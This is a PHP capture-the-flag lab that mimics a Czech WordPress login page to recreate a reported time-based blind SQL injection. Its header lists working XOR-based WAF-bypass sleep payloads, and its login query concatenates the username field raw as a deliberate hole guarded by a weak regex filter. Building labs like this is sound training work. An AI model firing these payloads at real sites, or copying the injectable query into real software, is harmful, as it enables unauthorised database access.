<?php
// ============================================================
// SQL Injection Lab 119 — Time-Based Blind SQLi + XOR WAF Bypass
// Platform: WordPress wp-login.php (www.acronis.cz)
// HackerOne Report #1224660
// Endpoint: POST /wp-login.php
// Injection point: `log` POST param (username/email field)
// Type: Time-based blind
//
// WAF blocks (instant 403):
//   log=' OR sleep(5) -- -
//   log=' AND sleep(5) -- -
//
// XOR bypass PASSES WAF → causes time delay:
//   log=0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z   → ~0.9s baseline
//   log=0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z   → ~5s
//   log=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z  → ~10s ← confirmed SQLi
// ============================================================

$server   = "localhost";
$username = "root";
$password = "";
$database = "VexiumCTF_DB";

$conn = mysqli_connect($server, $username, $password);
if (!$conn) die("DB connection failed");
mysqli_query($conn, "CREATE DATABASE IF NOT EXISTS $database");
mysqli_select_db($conn, $database);

function initializeLab119Database($conn) {
    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab119_users (
        ID               INT AUTO_INCREMENT PRIMARY KEY,
        user_login       VARCHAR(60)  NOT NULL,
        user_pass        VARCHAR(255) NOT NULL,
        user_email       VARCHAR(100) NOT NULL,
        display_name     VARCHAR(250) NOT NULL,
        user_registered  DATETIME     NOT NULL,
        INDEX idx_login (user_login)
    )");
    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab119_secret (
        id          INT AUTO_INCREMENT PRIMARY KEY,
        secret_data VARCHAR(100) NOT NULL
    )");
    $chk = mysqli_query($conn, "SELECT * FROM lab119_secret LIMIT 1");
    if (mysqli_num_rows($chk) == 0) {
        mysqli_query($conn, "INSERT INTO lab119_secret (secret_data) VALUES ('flag{acronis_wp_login_sqli_1224660}')");
    }
    $chku = mysqli_query($conn, "SELECT COUNT(*) AS c FROM lab119_users");
    $r = mysqli_fetch_assoc($chku);
    if ((int)$r['c'] === 0) {
        mysqli_query($conn, "INSERT INTO lab119_users (user_login, user_pass, user_email, display_name, user_registered) VALUES
            ('admin', '" . password_hash('Acronis2021!', PASSWORD_BCRYPT) . "', 'admin@acronis.cz', 'Acronis Admin', '2020-01-15 08:00:00')");
    }
}
initializeLab119Database($conn);

// ============================================================
// Simulated WAF — blocks obvious SQLi patterns
// The XOR technique BYPASSES this WAF (report #1224660 is a bypass of #1109311)
// ============================================================
function wafCheck($input) {
    $blocked = [
        "/'\s*(or|and)\s+(sleep|benchmark)\s*\(/i",    // ' OR sleep( , ' AND sleep(
        "/'\s*(or|and)\s+[\d]+\s*=\s*[\d]+/i",         // ' OR 1=1
        "/'\s*(or|and)\s+(true|false)/i",               // ' OR true
        "/union\s+select/i",                            // UNION SELECT
        "/--[\s\+\-]+/",                                // comment suffix -- + or --
    ];
    foreach ($blocked as $p) {
        if (preg_match($p, $input)) return true;
    }
    return false;
}

$loginError   = '';
$wafTriggered = false;
$loginOk      = false;
$postAttempt  = ($_SERVER['REQUEST_METHOD'] === 'POST');

if ($postAttempt) {
    $log = $_POST['log'] ?? '';
    $pwd = $_POST['pwd'] ?? '';

    if (wafCheck($log) || wafCheck($pwd)) {
        $wafTriggered = true;
    } else {
        // ====================================================================
        // ⚠ VULNERABLE QUERY — `log` parameter injected raw into WHERE clause
        //
        //   XOR payload:  0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
        //   Resulting SQL:
        //     WHERE user_login = '0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z'
        //
        //   MySQL evaluates sleep(10) → causes ~10 second response delay
        //   With INDEX on user_login, sleep() evaluates once (predictable)
        // ====================================================================
        $sql    = "SELECT ID, user_login, user_pass FROM lab119_users WHERE user_login = '$log'";
        $result = mysqli_query($conn, $sql);

        $user = $result ? mysqli_fetch_assoc($result) : null;
        if ($user && password_verify($pwd, $user['user_pass'])) {
            $loginOk = true;
        } elseif ($user) {
            $loginError = 'heslo';
        } else {
            $loginError = 'login';
        }
    }
}

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
?>
<!DOCTYPE html>
<html lang="cs-CZ">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Přihlásit se ‹ Acronis Czech Republic — WordPress</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
html,body{height:100%;}
body{background:#f1f1f1;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,sans-serif;font-size:14px;color:#3c434a;min-height:100vh;}

/* ── WP Login Layout ─────────────────────────────────────────────────────── */
#login{width:320px;padding:20px 0 0;margin:0 auto;position:relative;top:0;}
body.login{display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding-top:60px;}

/* ── Logo ────────────────────────────────────────────────────────────────── */
#login-logo{text-align:center;margin-bottom:24px;}
#login-logo a{display:inline-block;text-decoration:none;}
.acronis-logo{display:flex;flex-direction:column;align-items:center;gap:4px;}
.acronis-diamond{width:52px;height:52px;}
.acronis-wordmark{font-size:1.1rem;font-weight:800;color:#004B87;letter-spacing:.06em;text-transform:uppercase;}

/* ── Login Form Card ─────────────────────────────────────────────────────── */
#loginform,#waf-error-box,#success-box{
  background:#fff;
  border:1px solid #c3c4c7;
  box-shadow:0 1px 3px rgba(0,0,0,.04);
  padding:26px 24px 46px;
  border-radius:2px;
  width:100%;
}
.login-username,.login-password{margin-bottom:14px;}
.login-username label,.login-password label{
  display:block;font-size:14px;font-weight:600;margin-bottom:4px;color:#50575e;
}
.login-username input,.login-password input{
  width:100%;border:1px solid #8c8f94;border-radius:4px;padding:7px 10px;
  font-size:16px;color:#2c3338;outline:none;font-family:inherit;transition:border-color .12s;
  background:#fff;
}
.login-username input:focus,.login-password input:focus{
  border-color:#004B87;box-shadow:0 0 0 2px rgba(0,75,135,.12);
}
.login-remember{display:flex;align-items:center;gap:6px;font-size:13px;color:#50575e;margin-bottom:0;}
.login-remember input{width:16px;height:16px;cursor:pointer;}
.login-submit{float:right;}
.wp-submit{
  background:#004B87;border:1px solid #004B87;color:#fff;font-size:13px;font-weight:600;
  padding:8px 12px;border-radius:3px;cursor:pointer;font-family:inherit;
  transition:background .15s;white-space:nowrap;
}
.wp-submit:hover{background:#00376b;}
.forgetmenot-submit{display:flex;justify-content:space-between;align-items:center;margin-top:16px;}

/* ── Error Message ───────────────────────────────────────────────────────── */
.login-error{background:#fff;border-left:4px solid #d63638;padding:10px 12px;margin:0 0 16px;font-size:13px;color:#d63638;border-radius:0 2px 2px 0;}
.login-error p{margin:0;}
.login-error a{color:#d63638;font-weight:700;}

/* ── WAF Error Box ───────────────────────────────────────────────────────── */
#waf-error-box{border-left:4px solid #d63638;padding:20px 24px;text-align:center;}
.waf-code{font-size:2rem;font-weight:800;color:#d63638;margin-bottom:4px;}
.waf-title{font-size:1rem;font-weight:700;color:#2c3338;margin-bottom:8px;}
.waf-msg{font-size:.82rem;color:#646970;line-height:1.5;}
.waf-ip{font-family:monospace;font-size:.78rem;background:#f6f7f7;padding:4px 8px;border-radius:3px;color:#646970;display:inline-block;margin-top:8px;}
.waf-retry{display:inline-block;margin-top:14px;font-size:.78rem;color:#004B87;text-decoration:none;cursor:pointer;}

/* ── Success Box ─────────────────────────────────────────────────────────── */
#success-box{border-left:4px solid #00a32a;text-align:center;padding:20px 24px;}
.success-title{font-size:.95rem;font-weight:700;color:#00a32a;margin-bottom:6px;}
.success-msg{font-size:.82rem;color:#646970;}
.success-redirect{font-size:.78rem;color:#004B87;margin-top:10px;}

/* ── Footer Links ────────────────────────────────────────────────────────── */
#nav,.login-footer{margin-top:14px;padding:0;text-align:center;font-size:13px;}
#nav a,.login-footer a{color:#646970;text-decoration:none;padding:0 4px;}
#nav a:hover,.login-footer a:hover{color:#004B87;text-decoration:underline;}
.login-footer{margin-top:8px;}

/* ── Bottom bar ──────────────────────────────────────────────────────────── */
.wp-copyright{text-align:center;font-size:.7rem;color:#aaa;margin-top:20px;padding-bottom:20px;}
.wp-copyright a{color:#aaa;text-decoration:none;}
.wp-copyright a:hover{color:#004B87;}
</style>
</head>
<body class="login wp-core-ui">

<div id="login">

  <!-- Acronis Logo -->
  <div id="login-logo">
    <a href="https://www.acronis.cz" title="Zpět na www.acronis.cz" tabindex="-1">
      <div class="acronis-logo">
        <svg class="acronis-diamond" viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">
          <polygon points="26,2 50,26 26,50 2,26" fill="#004B87"/>
          <polygon points="26,10 42,26 26,42 10,26" fill="#fff" opacity=".18"/>
          <polygon points="26,16 36,26 26,36 16,26" fill="#fff" opacity=".35"/>
          <polygon points="26,22 30,26 26,30 22,26" fill="#fff"/>
        </svg>
        <span class="acronis-wordmark">Acronis</span>
      </div>
    </a>
  </div>

  <?php if ($wafTriggered): ?>
  <!-- WAF Block Response -->
  <div id="waf-error-box">
    <div class="waf-code">403</div>
    <div class="waf-title">Přístup odepřen</div>
    <div class="waf-msg">
      Bezpečnostní filtr detekoval podezřelý vstup v přihlašovacím formuláři.<br>
      Váš požadavek byl zablokován z důvodu ochrany před SQL injekcí.
    </div>
    <div class="waf-ip">Request blocked — WAF rule triggered</div>
    <br>
    <a class="waf-retry" href="index.php">← Zpět na přihlášení</a>
  </div>

  <?php elseif ($loginOk): ?>
  <!-- Login Success -->
  <div id="success-box">
    <div class="success-title">&#10003; Přihlášení bylo úspěšné</div>
    <div class="success-msg">Přesměrování na administraci…</div>
    <div class="success-redirect">→ <a href="index.php">www.acronis.cz/wp-admin/</a></div>
  </div>

  <?php else: ?>
  <!-- Login Error Message -->
  <?php if ($loginError === 'login'): ?>
  <div class="login-error">
    <p><strong>Chyba:</strong> Nesprávné uživatelské jméno. <a href="#">Zapomněli jste uživatelské jméno?</a></p>
  </div>
  <?php elseif ($loginError === 'heslo'): ?>
  <div class="login-error">
    <p><strong>Chyba:</strong> Heslo, které jste zadali pro uživatelské jméno <strong><?= esc($_POST['log'] ?? '') ?></strong>, je nesprávné. <a href="#">Zapomněli jste heslo?</a></p>
  </div>
  <?php endif; ?>

  <!-- Login Form -->
  <form name="loginform" id="loginform" action="index.php" method="post">
    <div class="login-username">
      <label for="user_login">Uživatelské jméno nebo e-mailová adresa</label>
      <input type="text" name="log" id="user_login"
             value="<?= esc($_POST['log'] ?? '') ?>"
             size="20" autocapitalize="none" autocomplete="username" spellcheck="false">
    </div>
    <div class="login-password">
      <label for="user_pass">Heslo</label>
      <input type="password" name="pwd" id="user_pass"
             value="" size="20" autocomplete="current-password" spellcheck="false">
    </div>
    <div class="forgetmenot-submit">
      <label class="login-remember">
        <input name="rememberme" type="checkbox" id="rememberme" value="forever">
        Zapamatovat si
      </label>
      <div class="login-submit">
        <input type="submit" name="wp-submit" id="wp-submit" class="wp-submit"
               value="Přihlásit se">
      </div>
    </div>
    <input type="hidden" name="redirect_to" value="https://www.acronis.cz/wp-admin/">
    <input type="hidden" name="testcookie" value="1">
  </form>

  <p id="nav">
    <a href="#">Ztratili jste heslo?</a>
  </p>

  <?php endif; ?>

</div><!-- #login -->

<div class="wp-copyright">
  <p>
    <a href="https://www.acronis.cz">&larr; Zpět na www.acronis.cz</a>
    &nbsp;&bull;&nbsp;
    <a href="https://hackerone.com/reports/1224660" target="_blank" rel="noopener">HackerOne #1224660</a>
  </p>
</div>

</body>
</html>
